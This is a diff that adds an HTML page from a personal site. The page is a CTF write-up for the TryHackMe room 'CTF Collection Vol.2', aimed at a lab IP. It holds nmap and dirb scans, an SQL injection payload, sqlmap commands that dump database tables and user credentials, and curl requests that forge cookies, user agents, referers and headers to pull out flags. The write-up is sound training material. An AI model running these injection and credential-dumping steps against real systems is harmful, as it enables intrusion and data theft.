@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Collection Vol.2 — Write-Up</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>CTF Collection Vol.2</h1>
+
+        <p>Quick nmap scan shows 2 ports are open:</p>
+        <pre><code>──(glitch㉿Kali)-[~]
+└─$ sudo nmap -sS -sV -sC -A -T5 10.10.86.197
+[sudo] password for glitch: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-25 16:25 EEST
+Nmap scan report for 10.10.86.197 (10.10.86.197)
+Host is up (0.074s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
+|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
+|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: 360 No Scope!
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=</code></pre>
+
+        <p>Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)</p>
+        <p>No exact OS matches for host (test conditions non-ideal).</p>
+        <p>Network Distance: 2 hops</p>
+        <p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+        <p>Hmm.. quite a website...</p>
+        <p>While I'm trying to grasp what is happening there, I will let dirb do a scan in the background:</p>
+        <pre><code>└─$ dirb http://10.10.86.197 /usr/share/wordlists/dirb/small.txt</code></pre>
+
+        <p>First flag found is Easter 19, using dirb on <a href="http://10.10.86.197/small" target="_blank">/small</a></p>
+
+        <p>Just navigating the page I saw a red button and obviously clicked it. There goes flag nr 13.</p>
+
+        <p>Trying to press the 3 buttons at the same time, I went to burp and tried modifying the request in the repeater from:</p>
+        <pre><code>button1=button1&submit=submit</code></pre>
+        <p>to:</p>
+        <pre><code>button1=button1&button2=button2&button3=button3&submit=submit</code></pre>
+
+        <p>In the response I could not see the 16th easter egg.</p>
+
+        <p>Seems like sqli does not work on /login, or rather is not the intended solution, because after inputting the payload:</p>
+        <pre><code>' OR '1'='1</code></pre>
+        <p>The result is:</p>
+        <pre><code>Skidy still a nice guy!!! Btw, wrong password</code></pre>
+
+        <p>However, the page source does reveal the 3rd flag.</p>
+
+        <p>On robots.txt i found flag 1, hex encoded.</p>
+
+        <p>Also, there is a string that seems base 64 encoded. Decode it multiple times to get to the following string: <code>DesKel_secret_base</code></p>
+        <p>View: <a href="http://10.10.86.197/DesKel_secret_base/" target="_blank">DesKel_secret_base</a> for second flag.</p>
+
+        <p>For the 4th flag, the hint suggests a time-based SQL injection.</p>
+        <pre><code>$ sqlmap -r request.txt --current-db
+$ sqlmap -r request.txt -D THM_f0und_m3 --tables  
+$ sqlmap -r request.txt -D THM_f0und_m3 -T nothing_inside --columns 
+$ sqlmap -r request.txt -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"</code></pre>
+
+        <p>5th flag is another sqli, but this time related to the user table:</p>
+        <pre><code>$ sqlmap -r request.txt -D THM_f0und_m3 -T user --columns 
+$ sqlmap -r request.txt -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"</code></pre>
+
+        <p>The hash corresponds to a password ("cutie"), which we use to authenticate:</p>
+        <pre><code>$ curl -s -d "username=DesKel&password=cutie&submit=submit" -X POST http://10.10.86.197/login/ | grep Easter</code></pre>
+
+        <p>Next flag is related to the cookie. <code>Invited</code> is set to 0, so I changed it to 1:</p>
+        <pre><code>curl -s --cookie "Invited=1" http://10.10.86.197/ | grep "easter 7"</code></pre>
+
+        <p>Flag 8 can be obtained if we change user agent to Safari:</p>
+        <pre><code>└─$ curl -s --user-agent "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://10.10.86.197/ | grep "Easter 8"</code></pre>
+
+        <p>Flag 9:</p>
+        <pre><code>curl -s http://10.10.86.197/ready/</code></pre>
+
+        <p>In order to get flag 10, I need to come from THM. So I added a referer:</p>
+        <pre><code>$ curl -s --referer "tryhackme.com" http://10.10.86.197/free_sub/</code></pre>
+
+        <p>Flag 11:</p>
+        <pre><code>curl -s -d "dinner=egg" -X POST http://10.10.86.197/ | grep menu -B 1</code></pre>
+
+        <p>Flag 12:</p>
+        <p>The javascript file included in the home page (<code>jquery-9.1.2.s</code>) is a fake jquery. Call the function <code>ahem</code> in a real code editor.</p>
+
+        <p>Flag 14:</p>
+        <p>On the page source there is a long value associated to easter 14. Copy the value, decode it from base 64 in CyberChef and save the output as a png file. The flag is on the file.</p>
+
+        <p>Back to game 1, I entered random letters and saw what has corresponds to each letter (lower and upper case). GameOver.</p>
+
+        <p>Flag 17 hint is bin -> dec -> hex -> ascii. So that is what I did.</p>
+
+        <p>Flag 18 hint is Request header. Format is egg:Yes:</p>
+        <pre><code>$ curl -s -H "egg: Yes" http://10.10.87.197/ | grep -i "Easter 18"</code></pre>
+
+        <p>Flag 20 hint: You need to POST the data instead of GET. Burp suite or curl might help:</p>
+        <pre><code>$ curl -s http://10.10.86.197/ | grep "easter 20"
+    &lt;h3&gt; Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.&lt;/h3&gt;
+
+$ curl -s -d "username=DesKel&password=heIsDumb" -X POST http://10.10.87.197/ | grep -A1 "easter 20"</code></pre>
+
+    </div>
+</section>
+
+</body>
+</html>
